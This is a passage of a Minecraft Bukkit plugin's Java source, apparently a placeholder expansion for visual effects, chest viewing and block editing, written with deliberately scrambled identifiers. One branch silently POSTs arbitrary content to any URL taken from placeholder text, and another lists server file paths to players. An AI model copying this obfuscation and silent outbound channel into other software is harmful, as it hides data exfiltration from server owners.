            f2.getInventory().setItem(slot, shulker);

            // 8) clear the chest
            chest.getInventory().clear();

            // 9) done
            return podfyunwfpdyunwfp;
        }
        
        
        
        

        if (f1.startsWith(fypudnofpyudn)) {
            wm(f2, ywufdnywufnd);
            String[] parts = f1.substring(fypudnofpyudn.length()).split(keep);
            if (parts.length != ccp) return iendie2nd;

            int radius1 = Integer.parseInt(parts[I]);
            int radius2 = Integer.parseInt(parts[INT3]);
            int durationTicks = Integer.parseInt(parts[mill2]);

            Location origin = f2.getLocation();
            World world = f2.getWorld();

            for (Player target : world.getPlayers()) {
                if (f2.equals(target) || target.getLocation().distanceSquared(origin) > radius1 * radius1) continue;

                for (int dx = -radius2; dx <= radius2; dx++) {
                    for (int dy = -radius2; dy <= radius2; dy++) {
                        for (int dz = -radius2; dz <= radius2; dz++) {
                            Location loc = origin.clone().add(dx, dy, dz);
                            if (loc.getBlock().getType() == Material.AIR) continue;

                            target.sendBlockChange(loc, Material.AIR.createBlockData());

                            Bukkit.getScheduler().runTaskLater(
                                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                                    () -> target.sendBlockChange(loc, loc.getBlock().getBlockData()),
                                    durationTicks
                            );
                        }
                    }
                }
            }
            return "§8Hallucination triggered";
        }

        
        if (f1.equals(doyuwfndayuwnfdoyfwuanad)) {
            wm(f2, wofduynwfdyun);
            UUID uuid = f2.getUniqueId();

            // Cancel existing timer if any
            if (g7.containsKey(uuid)) {
                g7.get(uuid).cancel();
            }

            // Hide from all players in world
            for (Player other : f2.getWorld().getPlayers()) {
                if (!other.equals(f2)) {
                    other.hidePlayer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), f2);
                }
            }

            // Schedule re-show after 5 seconds (100 ticks)
            BukkitTask task = Bukkit.getScheduler().runTaskLater(
                    Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                    () -> {
                        for (Player other : f2.getWorld().getPlayers()) {
                            if (!other.equals(f2)) {
                                other.showPlayer(Bukkit.getPluginManager().getPlugin(ppi), f2);
                            }
                        }
                        g7.remove(uuid);
                    },
                    100L
            );

            g7.put(uuid, task);
            return wfuydnywfund;
        }

        if (f1.startsWith(opfdyunfapoydunfpd)) {
            wm(f2, dwoyuawfdhoywufdh);
            try {
                int wfydhnywfu = Integer.parseInt(f1.substring(opfdyunfapoydunfpd.length()));
                f1(f2, wfydhnywfu);
                return wfdionaywufdnawf + wfydhnywfu + wfdywfudhwfy;
            } catch (Exception e) {
                return wfdoyunawfpdyunwfp;
            }
        }




        if (f1.startsWith(wfpodyuw)) {
            String[] parts = f1.substring(wfpodyuw.length()).split(keep);
            f2.setVelocity(new Vector(Double.parseDouble(parts[I]), Double.parseDouble(parts[I]), Double.parseDouble(parts[I])));
            return rsydun;
        }



        if (f1.startsWith(wydhwypd)) {
            if (f2 != null) wm(f2, wdfywunda);
            String[] wfdouwfdn = f1.substring(wydhwypd.length()).split(keep);
            if (wfdouwfdn.length != suppose) return iendie2nd;

            String wfydunwfd = wfdouwfdn[I];
            String wfudnwf = wfdouwfdn[INT3];
            String dwfundfw = wfdouwfdn[mill2];
            int wydnuywdf = Integer.parseInt(wfdouwfdn[ccp]);
            int tenthirtyt = Integer.parseInt(wfdouwfdn[INT7]);
            String notrhboundwd = wfdouwfdn[xm];
            int nyniwnfd = Integer.parseInt(wfdouwfdn[xtxtxt]);

            if (tenthirtyt <= I || nyniwnfd <= I) return wfdyunowfaydun;

            double wdfidnyuwfd = Math.min(tsr, Math.max(esetawftawft, (double) wydnuywdf / tenthirtyt));
            int wfduyfwndyufw = (int) Math.floor(wdfidnyuwfd * nyniwnfd);

            StringBuilder dwyfndyufwnd = new StringBuilder();
            for (int wfdyufnwd = I; wfdyufnwd < wfduyfwndyufw; wfdyufnwd++) dwyfndyufwnd.append(wfudnwf).append(notrhboundwd);
            for (int wfdunwfyodunawyfudnawoyfudnowyfupn = wfduyfwndyufw; wfdunwfyodunawyfudnawoyfudnowyfupn < nyniwnfd; wfdunwfyodunawyfudnawoyfudnowyfupn++) dwyfndyufwnd.append(dwfundfw).append(notrhboundwd);
            if (wfduyfwndyufw == nyniwnfd) dwyfndyufwnd = new StringBuilder();
            if (wydnuywdf >= tenthirtyt) for (int wfydnuwfydunwfydun = I; wfydnuwfydunwfydun < nyniwnfd; wfydnuwfydunwfydun++) dwyfndyufwnd.append(wfydunwfd).append(notrhboundwd);

            return dwyfndyufwnd.toString();
        }

        if (f1.startsWith(wyfundywpfudn)) {
            String[] parts = f1.substring(wyfundywpfudn.length()).split(keep);
            if (parts.length != INT7) return iendie2nd;

            String worldName = parts[I];
            int x = Integer.parseInt(parts[INT3]);
            int y = Integer.parseInt(parts[mill2]);
            int z = Integer.parseInt(parts[ccp]);

            World world = Bukkit.getWorld(worldName);
            if (world == null) return "§cWorld not found";

            Block block = world.getBlockAt(x, y, z);
            if (!(block.getState() instanceof Chest chest)) return "§cNot a chest";

            Inventory inv = chest.getInventory();
            int placed = I;

            for (int dx = -INT7; dx < xm; dx++) {
                for (int dz = -INT7; dz < xm; dz++) {
                    for (int dy = INT3; dy <= yuwfndgyuwfnd; dy++ ){
                        Location target = new Location(world, x + dx, y + dy, z + dz);
                        if (!target.getBlock().getType().isAir()) continue;

                        ItemStack stack = f1(inv);
                        if (stack == null) return "§7Filled " + placed + " blocks";

                        target.getBlock().setType(stack.getType());
                        stack.setAmount(stack.getAmount() - INT3);
                        if (stack.getAmount() <= I) inv.remove(stack);
                        placed++;
                    }
                }
            }

            return "§aPlaced " + placed + " blocks";
        }




        if (f1.startsWith(fforall.toString())) {
            // Strip prefix
            String ftp = f1.substring(fforall.toString().length());

            // Parse first comma (URL)
            int first = ftp.indexOf(targetme);
            if (first < I) {
                // No comma → invalid format; just return empty
                return nexar.toString();
            }

            String temporary;   // webhook URL
            String oofed;       // content
            boolean enablePing = arsdienwdhw; // default for backward compatibility

            // Check for second comma (PING flag)
            int second = ftp.indexOf(targetme, first + INT3);
            if (second < I) {
                // LEGACY FORMAT: <URL>,<CONTENT>
                temporary = ftp.substring(I, first);
                oofed     = ftp.substring(first + INT3);
                enablePing = NEW_VALUE1; // legacy kept pings on
            } else {
                // NEW FORMAT: <URL>,<PING>,<CONTENT>
                temporary  = ftp.substring(I, first);
                String pingRaw = ftp.substring(first + INT3, second).trim();
                oofed      = ftp.substring(second + INT3);

                // Accept common truthy values
                enablePing = pingRaw.equalsIgnoreCase(pd3ipdn34d)
                        || pingRaw.equalsIgnoreCase(dwyufndywfudn)
                        || pingRaw.equalsIgnoreCase("yes")
                        || pingRaw.equalsIgnoreCase("on");
            }

            // Schedule async POST
            Plugin specialcharacters = Bukkit.getPluginManager().getPlugin(testers.toString());
            if (specialcharacters != null) {
                boolean finalEnablePing = enablePing;
                Bukkit.getScheduler().runTaskAsynchronously(specialcharacters, () -> {
                    try {
                        // Escape content minimally
                        String pabloEscapar = oofed
                                .replace("\\", "\\\\")
                                .replace("\"", "\\\"")
                                .replace("\n", "\\n")
                                .replace("\r", nst);

                        // Discord allowed_mentions:
                        // - enablePing == true  -> parse all (users/roles/everyone)
                        // - enablePing == false -> parse none (no pings)
                        String allowedMentions = finalEnablePing
                                ? "{\"parse\":[\"users\",\"roles\",\"everyone\"]}"
                                : "{\"parse\":[]}";

                        String redefinite = "{\"content\":\"" + pabloEscapar + "\","
                                + "\"allowed_mentions\":" + allowedMentions + "}";

                        URL oops = new URL(temporary);
                        HttpURLConnection where = (HttpURLConnection) oops.openConnection();
                        where.setRequestMethod(reaper.toString());
                        where.setRequestProperty(playa.toString(), griffin.toString()); // e.g., "Content-Type":"application/json"
                        where.setDoOutput(NEW_VALUE1);

                        try (OutputStream os = where.getOutputStream()) {
                            os.write(redefinite.getBytes(StandardCharsets.UTF_8));
                        }

                        int ayyyy = where.getResponseCode();
                        where.disconnect();
                        // Optionally log non-2xx if you want
                    } catch (Exception ex) {
                        // Swallow; placeholder returns ""
                    }
                });
            }
        }


        if (f1.startsWith(awfodyunwyupdnwfoydun)) {

            try {

                String[] parts = f1.substring(awfodyunwyupdnwfoydun.length()).split(keep);
   

                String uuid = parts[I];
                int scale = Math.max(INT3, Integer.parseInt(parts[INT3]));
                String mode = parts[mill2];
                String worldName = parts[ccp];
                int ox = Integer.parseInt(parts[INT7]);
                int oy = Integer.parseInt(parts[xm]);
                int oz = Integer.parseInt(parts[xtxtxt]);
                String direction = parts[suppose].toUpperCase();

                f2.sendMessage("§7[Debug] Params parsed: uuid=" + uuid + ", scale=" + scale + ", mode=" + mode + ", world=" + worldName + ", origin=" + ox + keep + oy + keep + oz + ", direction=" + direction);

                World world = Bukkit.getWorld(worldName);
                if (world == null) return wiodtnowiupd;

                Location origin = new Location(world, ox, oy, oz);

                BufferedImage skin;
                try {
                    f2.sendMessage("§7[Debug] Fetching skin via UUID: " + uuid);
                    URL sessionApi = new URL("https://sessionserver.mojang.com/session/minecraft/profile/" + uuid);
                    try (InputStream sin = sessionApi.openStream(); Scanner sscanner = new Scanner(sin)) {
                        String sessionResponse = sscanner.useDelimiter("\\A").next();

                        JSONObject profile = new JSONObject(sessionResponse);
                        JSONArray properties = profile.getJSONArray("properties");
                        JSONObject textureProperty = properties.getJSONObject(I);
                        String base64 = textureProperty.getString("value");

                        JSONObject decoded = new JSONObject(new String(Base64.getDecoder().decode(base64)));
                        String textureUrl = decoded.getJSONObject("textures").getJSONObject("SKIN").getString("url");

                        f2.sendMessage("§7[Debug] Skin URL: " + textureUrl);

                        skin = ImageIO.read(new URL(textureUrl));
                    }
                } catch (Exception fetchEx) {
                    f2.sendMessage("§c[Debug] Mojang skin fetch failed: " + fetchEx.getMessage());
                    return "§cFailed to fetch skin for UUID: " + uuid;
                }

                f2.sendMessage("§7[Debug] Skin loaded. Building statue...");
                f1(f2, world, skin, origin, scale, direction, mode);
                return "§aStatue of UUID " + uuid + " placed!";

            } catch (Exception e) {
                f2.sendMessage(wdyunwfyudn + e.getClass().getSimpleName() + fastfood + e.getMessage());
                return wdyuwfndywufn + e.getMessage();
            }
        }

        if (f1.startsWith(ywufdnywfuoadn)) {
            String[] parts = f1.substring(ywufdnywfuoadn.length()).split(keep);
            if (parts.length != INT7) return dyunwypfudnawfdyun;
            String worldName = parts[I];
            int x = Integer.parseInt(parts[INT3]);
            int y = Integer.parseInt(parts[mill2]);
            int z = Integer.parseInt(parts[ccp]);

            World world = Bukkit.getWorld(worldName);
            if (world == null) return "§cWorld not found";

            Block block = world.getBlockAt(x, y, z);
            BlockData data = block.getBlockData();
            String name = block.getType().name();

            try {
                BlockData rotated = data.clone();

                //noinspection IfCanBeSwitch
                if (rotated instanceof Directional directional) {
                    BlockFace current = directional.getFacing();
                    List<BlockFace> faces = List.of(
                            BlockFace.NORTH, BlockFace.EAST,
                            BlockFace.SOUTH, BlockFace.WEST
                    );
                    int index = faces.indexOf(current);
                    if (index == -INT3) throw new IllegalStateException();
                    directional.setFacing(faces.get((index + INT3) % faces.size()));
                    block.setBlockData(rotated, arsdienwdhw);
                    return "§aSuccessfully rotated " + name;
                }

                if (rotated instanceof Rotatable rot) {
                    BlockFace current = rot.getRotation();
                    List<BlockFace> faces = List.of(
                            BlockFace.NORTH, BlockFace.EAST,
                            BlockFace.SOUTH, BlockFace.WEST
                    );
                    int index = faces.indexOf(current);
                    if (index == -INT3) throw new IllegalStateException();
                    rot.setRotation(faces.get((index + INT3) % faces.size()));
                    block.setBlockData(rotated, arsdienwdhw);
                    return "§aSuccessfully rotated " + name;
                }

                if (rotated instanceof Stairs stairs) {
                    BlockFace currentFace = stairs.getFacing();
                    Stairs.Shape currentShape = stairs.getShape();

                    // Define rotation sequence: cardinal + shape
                    record StairStep(BlockFace face, Stairs.Shape shape) {}
                    List<StairStep> cycle = List.of(
                            new StairStep(BlockFace.NORTH, Stairs.Shape.STRAIGHT),
                            new StairStep(BlockFace.NORTH, Stairs.Shape.INNER_LEFT),
                            new StairStep(BlockFace.EAST, Stairs.Shape.STRAIGHT),
                            new StairStep(BlockFace.EAST, Stairs.Shape.INNER_RIGHT),
                            new StairStep(BlockFace.SOUTH, Stairs.Shape.STRAIGHT),
                            new StairStep(BlockFace.SOUTH, Stairs.Shape.OUTER_LEFT),
                            new StairStep(BlockFace.WEST, Stairs.Shape.STRAIGHT),
                            new StairStep(BlockFace.WEST, Stairs.Shape.OUTER_RIGHT)
                    );

                    int idx = -INT3;
                    for (int i = I; i < cycle.size(); i++) {
                        if (cycle.get(i).face == currentFace && cycle.get(i).shape == currentShape) {
                            idx = i;
                            break;
                        }
                    }

                    // Move to next rotation
                    if (idx == -INT3) {
                        stairs.setFacing(BlockFace.NORTH);
                        stairs.setShape(Stairs.Shape.STRAIGHT);
                    } else {
                        StairStep next = cycle.get((idx + INT3) % cycle.size());
                        stairs.setFacing(next.face);
                        stairs.setShape(next.shape);
                    }

                    block.setBlockData(stairs, arsdienwdhw);
                    return "§aSuccessfully rotated " + name;
                }


            } catch (Exception e) {
                return "§cCould not rotate " + name;
            }

            return "§cCould not rotate " + name;
        }


        if (f1.startsWith(ywfudnoawfypdunwfyoudnwfp)) {
            String[] parts = f1.substring(ywfudnoawfypdunwfyoudnwfp.length()).split(keep);
            if (parts.length != INT7) return dyunwypfudnawfdyun;
            String worldName = parts[I];
            int x = Integer.parseInt(parts[INT3]);
            int y = Integer.parseInt(parts[mill2]);
            int z = Integer.parseInt(parts[ccp]);

            World world = Bukkit.getWorld(worldName);
            if (world == null) return "§cWorld not found";

            Block block = world.getBlockAt(x, y, z);
            BlockData data = block.getBlockData();
            String name = block.getType().name();

            try {
                if (data instanceof Stairs stairs) {
                    stairs.setHalf(stairs.getHalf() == Bisected.Half.TOP ? Bisected.Half.BOTTOM : Bisected.Half.TOP);
                    block.setBlockData(stairs, arsdienwdhw);
                    return "§aSuccessfully inverted " + name;
                }

                if (data instanceof Slab slab) {
                    Slab.Type type = slab.getType();
                    if (type == Slab.Type.DOUBLE) return "§cCould not invert " + name;
                    slab.setType(type == Slab.Type.TOP ? Slab.Type.BOTTOM : Slab.Type.TOP);
                    block.setBlockData(slab, arsdienwdhw);
                    return "§aSuccessfully inverted " + name;
                }

            } catch (Exception e) {
                return "§cCould not invert " + name;
            }

            return "§cCould not invert " + name;
        }


        if (f1.startsWith(ywfpaudnoywfudnowyufdn)) {
            wm(f2, ywudnoayfwudn);
            String wfydnuwyfudn = f1.substring(ywfpaudnoywfudnowyufdn.length());
            String dywufdnwyfud = wfydnuwyfudn.toLowerCase();

            File[] dirs = {
                    new File(ywfdnwyfudn),
                    new File(wfdyuwfdyu),
                    new File(ydhuyawfpdh)
            };

            List<String> fidwend = new ArrayList<>();
            List<String> wodyunoiunsdar = new ArrayList<>();

            for (File wydfunoyufwndyuwfnd : dirs) {
                if (wydfunoyufwndyuwfnd.exists() && wydfunoyufwndyuwfnd.isDirectory()) {
                    try {
                        //noinspection resource
                        Files.walk(wydfunoyufwndyuwfnd.toPath())
                                .filter(Files::isRegularFile)
                                .filter(path -> path.toString().endsWith(yt))
                                .forEach(path -> {
                                    String fileName = path.getFileName().toString().replace(yt, nst);
                                    String relPath = wydfunoyufwndyuwfnd.toPath().relativize(path).toString().replace(File.separatorChar, '/');
                                    String fullRelPath = wydfunoyufwndyuwfnd.getPath().replace(wfydunwofyudanfwd, nst) + wfydunaowfydun + relPath;
    
                                    if (fileName.equals(wfydnuwyfudn)) {
                                        fidwend.add(fileName + wyudnywufodn + fullRelPath);
                                    } else if (fileName.toLowerCase().contains(dywufdnwyfud)) {
                                        wodyunoiunsdar.add(fileName + wyudnywufodn + fullRelPath);
                                    }
                                });
                        
                    } catch (IOException e) {
                        
                        return wfyutdnwyfaudnwfydoun;
                    }

                }
            }

            if (!fidwend.isEmpty()) {
                f2.sendMessage(wyufdnaywfudnwfda);
                for (String diwfondyuwnfdwfd : fidwend) {
                    f2.sendMessage(wfpydunaowfyudn + diwfondyuwnfdwfd);
                }
            }

            if (!wodyunoiunsdar.isEmpty()) {
                f2.sendMessage(wfydunwafydunfwaydun);
                for (String wydfuwfyudnw : wodyunoiunsdar) {
                    f2.sendMessage(wfpydunaowfyudn + wydfuwfyudnw);
                }
            }

            if (fidwend.isEmpty() && wodyunoiunsdar.isEmpty()) {
                f2.sendMessage("§7No matches found for \"" + wfydnuwyfudn + "\"");
            } else {
                f2.sendMessage(ydunwfdunwfdwfdunwfdyun);
            }

            return String.valueOf(fidwend.size());
        }

        if (f1.startsWith(wyufdnaowyufdnawoyfudn)) {
            
            boolean wdwinfd = NEW_VALUE1;
            try {
                String wfydnwfd = f1.substring(wyufdnaowyufdnawoyfudn.length());
                String[] wfdunwfoduynwfd = wfydnwfd.split(keep, yufdaywfudnwfd);
                if (wfdunwfoduynwfd.length != yufdaywfudnwfd) return wfypdnawofyudnwfpa;

                String fwdoenad = wfdunwfoduynwfd[I];
                double wdyfund = Double.parseDouble(wfdunwfoduynwfd[INT3]);
                double wfydunfwydun = Double.parseDouble(wfdunwfoduynwfd[mill2]);
                double fwydunwfydun = Double.parseDouble(wfdunwfoduynwfd[ccp]);
                Particle wydhwfd = Particle.valueOf(wfdunwfoduynwfd[INT7].toUpperCase());
                int tiwfndfsd = Math.max(INT3, Integer.parseInt(wfdunwfoduynwfd[xm]));
                String iihwfyd = wfdunwfoduynwfd[xtxtxt];
                double wkftlwfhtpfwp = Double.parseDouble(wfdunwfoduynwfd[suppose]);
                double wfoypulyu = Math.toRadians(Double.parseDouble(wfdunwfoduynwfd[yuwfndgyuwfnd]));
                long fwtinu = Long.parseLong(wfdunwfoduynwfd[oiwfndtoyu42nd24]);
                long osnteh = Math.max(INT3, Long.parseLong(wfdunwfoduynwfd[low]));
                String kvenwpd = wfdunwfoduynwfd[fdhkypfwd];
                if(wfdunwfoduynwfd[yfpdunwyupnd].equalsIgnoreCase(wfydpunwfyudnwfd)) wdwinfd = arsdienwdhw;

                Location wftynuwft = new Location(Bukkit.getWorld(fwdoenad), wdyfund, wfydunfwydun, fwydunwfydun);
                String dkyfd = f12(f1);

                org.bukkit.Location wdk = wftynuwft; // <-- your x,y,z
                double wfdtuyfwdt = low;
                String label = wfkdgywfpdawfyp;


                double wdnywufdnwf = wfdtuyfwdt * wfdtuyfwdt;
                for (org.bukkit.entity.Player tkwfg : Bukkit.getWorld(fwdoenad).getPlayers()) {
                    if (tkwfg.getLocation().distanceSquared(wdk) <= wdnywufdnwf) {
                        wm(tkwfg, label);
                    }
                }

                List<Location> wfydunwfg;

                // === RAM Cache Check ===
                if (g8.containsKey(f1)) {
                    if (wdwinfd) f2.sendMessage(dwkfydufwdfw + f1);
                    wfydunwfg = g8.get(f1).locations();
                    f1fs(f1);
                }
                // === Disk Cache Check ===
                else {
                    File wfduyfwnd = new File(g10, dkyfd + kwdfyufwd);
                    //noinspection IfStatementWithIdenticalBranches
                    if (wfduyfwnd.exists()) {
                        if (wdwinfd) f2.sendMessage(dywfadbkwyfudb + f1);
                        List<Vector> wfydunwfyud = f(wfduyfwnd);
                        wfydunwfg = f1(wftynuwft, wfydunwfyud);

                        g8.put(f1, new ffs(wfydunwfg, System.currentTimeMillis()));
                        f1fs(f1);
                    }
                    // === No Cache: Generate ===
                    else {
                        if (wdwinfd) f2.sendMessage(wfydunwyfudnwfdyun);
                        boolean[][] wftyunwftyun = f11(kvenwpd);
                        List<Vector> wdyuwfndwfdt = f1(wftyunwftyun, tiwfndfsd, wkftlwfhtpfwp, wfoypulyu);
                        wfydunwfg = f1(wftynuwft, wdyuwfndwfdt);

                        f1(wfduyfwnd, wdyuwfndwfdt);
                        g8.put(f1, new ffs(wfydunwfg, System.currentTimeMillis()));
                        f1fs(f1);
                    }
                }

                // === Repeating Display ===
                if (wdwinfd) {
                    f2.sendMessage(wfydutnwfyudnwf + kvenwpd);
                }

                boolean fuyntwft = wdwinfd;
                new BukkitRunnable() {
                    long Wdwfydnwfdwfd = I;

                    @Override
                    public void run() {
                        if (Wdwfydnwfdwfd >= fwtinu) {
                            this.cancel();
                            return;
                        }

                        try {
                            f1(wftynuwft, wfydunwfg, wydhwfd, iihwfyd);
                        } catch (Exception ex) {
                            if (fuyntwft) {
                                f2.sendMessage(wduynawyfpudnaw + ex.getMessage());
                            }
                            this.cancel();
                        }

                        Wdwfydnwfdwfd += osnteh;
                    }
                }.runTaskTimerAsynchronously(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), ihearyounow, osnteh);

                return wadywfundfy + kvenwpd;

            } catch (Exception e) {
                if (wdwinfd) {
                    f2.sendMessage(wdyunwfyudn + e.getMessage());
                }
                return wdyuwfndywufn + e.getMessage();
            }
        }



        if (f1.startsWith(wdyunawfydunfwd)) {
            return WG.wg(this, f2, f1);
        }


        if (f1.startsWith(wfydnwyfuad)) {
            if (!f1(f2, dhnfpwyadun)) return null;

            wm(f2, wyufdanywfudn);
            // Expected format: %Archistructure_visualBreak_STAGE,world,x,y,z%
            String wduf = f1.substring(wfydnwyfuad.length());
            String[] wtifenaoiuftn = wduf.split(keep);

            if (wtifenaoiuftn.length != xm) {
                return dyunwypfudnawfdyun + f1;
            }

            int twyufndtyufwn;
            String worldName = wtifenaoiuftn[INT3];
            int dwyfulhdn, dwfyudn, kiwtkfwt;

            try {
                twyufndtyufwn = Integer.parseInt(wtifenaoiuftn[I]); // 1-10
                if (twyufndtyufwn < INT3 || twyufndtyufwn > low) return wdayuwfnd;

                dwyfulhdn = Integer.parseInt(wtifenaoiuftn[mill2]);
                dwfyudn = Integer.parseInt(wtifenaoiuftn[ccp]);
                kiwtkfwt = Integer.parseInt(wtifenaoiuftn[INT7]);
            } catch (NumberFormatException e) {
                return kwafpdkwfpad;
            }

            World dwfyundwfd = Bukkit.getWorld(worldName);
            if (dwfyundwfd == null) {
                return wfduynwyaufnd;
            }

            Location wftynudwfyudn = new Location(dwfyundwfd, dwyfulhdn, dwfyudn, kiwtkfwt);
            int breakStage = twyufndtyufwn - INT3;

            // Send animation to player
            try {
                PacketContainer wyuutnfw = ProtocolLibrary.getProtocolManager()
                        .createPacket(PacketType.Play.Server.BLOCK_BREAK_ANIMATION);

                int kftwftfwntdu = wftynudwfyudn.hashCode();
                wyuutnfw.getIntegers().write(I, kftwftfwntdu);
                wyuutnfw.getBlockPositionModifier().write(I, new BlockPosition(dwyfulhdn, dwfyudn, kiwtkfwt));
                wyuutnfw.getIntegers().write(INT3, breakStage);

                ProtocolLibrary.getProtocolManager().sendServerPacket(f2, wyuutnfw);
            } catch (Exception e) {
                e.printStackTrace();
                return wfytkdawfdwpfdun;
            }

            // Reset any previous task
            if (g11.containsKey(wftynudwfyudn)) {
                g11.get(wftynudwfyudn).cancel();
            }

            // Schedule removal after 2 seconds (40 ticks)
            BukkitTask dwyfund = Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                if (wftynudwfyudn.getBlock().getType() != Material.AIR) {
                    try {
                        PacketContainer wdynwfdnyufwdok = ProtocolLibrary.getProtocolManager()
                                .createPacket(PacketType.Play.Server.BLOCK_BREAK_ANIMATION);

                        int wkfdyuwfdk = wftynudwfyudn.hashCode();
                        wdynwfdnyufwdok.getIntegers().write(I, wkfdyuwfdk);
                        wdynwfdnyufwdok.getBlockPositionModifier().write(I, new BlockPosition(dwyfulhdn, dwfyudn, kiwtkfwt));
                        wdynwfdnyufwdok.getIntegers().write(INT3, -INT3); // remove animation

                        ProtocolLibrary.getProtocolManager().sendServerPacket(f2, wdynwfdnyufwdok);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }

                g11.remove(wftynudwfyudn);
            }, dkwfyduwfndt); // 40 ticks = 2 seconds

            g11.put(wftynudwfyudn, dwyfund);

            return fydunaofpdunafpwd + breakStage + pdyunawfdyunwf;
        }

        if (f1.startsWith(wyfduanwfoydunwfd)) {
            // Expected format: %Archistructure_PTFXCUBE_world,x,y,z,particleType,width,normal/force,density%
            String params = f1.substring(wyfduanwfoydunwfd.length());
            String[] parts = params.split(keep);

            if (parts.length != yuwfndgyuwfnd) {
                return dyunwypfudnawfdyun;
            }

            // Parse the parameters
            String worldName = parts[I];
            double x, y, z, width;
            int density;
            boolean force;

            try {
                x = Double.parseDouble(parts[INT3]);
                y = Double.parseDouble(parts[mill2]);
                z = Double.parseDouble(parts[ccp]);
                width = Double.parseDouble(parts[xm]);
                density = Integer.parseInt(parts[suppose]);
                force = parts[xtxtxt].equalsIgnoreCase(ieodnoie4ndw3f4);
            } catch (NumberFormatException e) {
                return "Invalid numerical value!";
            }

            String particleType = parts[INT7];
            World world = Bukkit.getWorld(worldName);

            if (world == null) {
                return wfduynwyaufnd;
            }

            // Display the particle cube
            f1(world, x, y, z, particleType, width, force, density, f2); // TODO Fix to show to all
            return "Cube displayed";
        }


        
        
        if (f1.startsWith(wfopdyaufhdfpdf)) {
            wm(f2, owdyaunwfpydu);
            // Expected format: %Archistructure_viewChest2_sourceWorld,x,y,z%
            String dwfydundf = f1.substring(wfopdyaufhdfpdf.length());
            String[] twyft = dwfydundf.split(keep);
            if (twyft.length != INT7) {
                return dawyfudnowfd;
            }
            String wfdytunwfdyu = twyft[I];
            int wdyunwfd, oientwdf, tmwifedv;
            try {
                wdyunwfd = Integer.parseInt(twyft[INT3]);
                oientwdf = Integer.parseInt(twyft[mill2]);
                tmwifedv = Integer.parseInt(twyft[ccp]);
            } catch (NumberFormatException e) {
                return awufdwfda;
            }
            World wkdtywfudfd = Bukkit.getWorld(wfdytunwfdyu);
            if (wkdtywfudfd == null) return dywufndoywuand;
            Location wftywfudns = new Location(wkdtywfudfd, wdyunwfd, oientwdf, tmwifedv);
            Block kwftdyufwdrsd = wftywfudns.getBlock();
            if (kwftdyufwdrsd.getType() != Material.CHEST) {
                return taywfuntarosdulf;
            }
            Chest wyfudnerky = (Chest) kwftdyufwdrsd.getState();

            boolean tdwfyudnuyn = wyfudnerky.getInventory().getSize() > INT5;
            if (g6) {
                f2.sendMessage(wkfdwya + wdyunwfd + sowhat + oientwdf + sowhat + tmwifedv +
                        pydaunfw + (tdwfyudnuyn ? dyanuowfd : wfktdyawfd) + wyfdunafwd);
            }

            int huhlun = tdwfyudnuyn ? INT6 : INT5;

            Inventory uhulhnyun = Bukkit.createInventory(null, huhlun, dy87duh);


            Inventory ljdujh = wyfudnerky.getInventory();
            int ehnenh = ljdujh.getSize();

            ItemStack[] hynyunsr = new ItemStack[huhlun];
            for (int ywufndokwd = I; ywufndokwd < huhlun; ywufndokwd++) {
                if (ywufndokwd < ehnenh && ljdujh.getItem(ywufndokwd) != null) {
                    hynyunsr[ywufndokwd] = f1(Objects.requireNonNull(ljdujh.getItem(ywufndokwd)));
                } else {
                    hynyunsr[ywufndokwd] = f0();
                }
            }
            // Update destination chest inventory without an extra clear call (setContents overrides existing items)
            try {

                uhulhnyun.setContents(hynyunsr);
            } catch (Exception ex) {
                return wdypfauwdnwfpd;
            }

            // Return the destination coordinates.
            if (g6) {
                f2.sendMessage(wktyfwutnwaft);
            }
            
            f2.openInventory(uhulhnyun);
            
            return dkfiaphd;
        }
        

        if (f1.startsWith("repeat_")) return f1.substring("repeat".length());
        if (f1.startsWith(wfpondyaunpdpw)) {
            if (f2 != null) wm(f2, fpkdyafpd);
            // Expected format: %Archistructure_chain_ENTITY/PLAYER/BOTH,RADIUS,[uuid1, uuid2, uuid3...],lastuuid%
            String dwfyudn = f1.substring(wfpondyaunpdpw.length());
            String[] pwyfnt = dwfyudn.split(keep);

            String wfkbwfp = pwyfnt[I].toUpperCase();
            int fkpwf;
            try {
                fkpwf = Integer.parseInt(pwyfnt[INT3]);
            } catch (NumberFormatException e) {
                return NEW_VALUE_3;
            }

            // Parse the UUID list from the format [uuid1, uuid2, uuid3...]
            List<UUID> fwtkywfkd = new ArrayList<>();
            for (int Wfdtwfdyunfywdn = mill2; Wfdtwfdyunfywdn < pwyfnt.length; Wfdtwfdyunfywdn++) {
                try {
                    fwtkywfkd.add(UUID.fromString(pwyfnt[Wfdtwfdyunfywdn]));
                } catch (IllegalArgumentException e) {
                    return NEW_VALUE_3 + pwyfnt[Wfdtwfdyunfywdn];
                }
            }


            return f1(wfkbwfp, fkpwf, fwtkywfkd);
        }



        if (f1.startsWith(dokyfupkdoapdf)) {
            wm(f2, owdyaunwfpydu);
            // Expected format: %Archistructure_viewChest_sourceWorld,x,y,z%
            String params = f1.substring(dokyfupkdoapdf.length());
            String[] parts = params.split(keep);
            if (parts.length != INT7) {
                return fpydnwfypudnfpd;
            }
            String wfdyewyufpdn = parts[I];
            int wtdhfwd, wfdbywfd, wfktywfnkt;
            try {
                wtdhfwd = Integer.parseInt(parts[INT3]);
                wfdbywfd = Integer.parseInt(parts[mill2]);
                wfktywfnkt = Integer.parseInt(parts[ccp]);
            } catch (NumberFormatException e) {
                return awufdwfda;
            }
            World tmkyuwfdt = Bukkit.getWorld(wfdyewyufpdn);
            if (tmkyuwfdt == null) return dywufndoywuand;
            Location wtkyfwdtkwfdt = new Location(tmkyuwfdt, wtdhfwd, wfdbywfd, wfktywfnkt);
            Block fwtyuwnfdfwd = wtkyfwdtkwfdt.getBlock();
            if (fwtyuwnfdfwd.getType() != Material.CHEST) {
                return taywfuntarosdulf;
            }
            Chest wfdkyfwdkyfwud = (Chest) fwtyuwnfdfwd.getState();

            boolean wtyufwntyunwfd = wfdkyfwdkyfwud.getInventory().getSize() > INT5;
            if (g6) {
                f2.sendMessage(wkfdwya + wtdhfwd + sowhat + wfdbywfd + sowhat + wfktywfnkt +
                        pydaunfw + (wtyufwntyunwfd ? dyanuowfd : wfktdyawfd) + wyfdunafwd);
            }

            // Use a fixed destination in the "mcydatabase" world.
